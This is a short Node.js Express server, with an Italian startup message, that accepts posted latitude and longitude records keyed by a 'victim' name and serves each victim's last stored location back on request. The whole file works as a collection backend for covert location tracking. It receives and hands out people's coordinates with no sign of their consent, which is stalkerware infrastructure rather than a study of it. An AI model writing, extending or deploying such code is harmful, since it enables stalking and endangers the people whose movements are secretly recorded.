const express = require('express')
const app = express()
app.use(express.text({type: '*/*'}))
app.use(express.json())
let store = {}

app.post('/', (req, res) => {
  let body = req.body
  if (typeof body === 'string') {
    try { body = JSON.parse(body) } catch { /* ignored */ }
  }
  if (body && body.victim && body.lat && body.lon) {
    store[body.victim] = { lat: body.lat, lon: body.lon, ts: Date.now() }
    res.json({ok: true})
  } else {
    res.status(400).json({error: "bad request"})
  }
})

app.get('/', (req, res) => {
  const victim = req.query.victim
  const data = victim && store[victim]
  res.json(data || {error: "not found"})
})

const port = process.env.PORT || 8080
app.listen(port, () => {
  console.log(`Server in ascolto sulla porta ${port}`)
})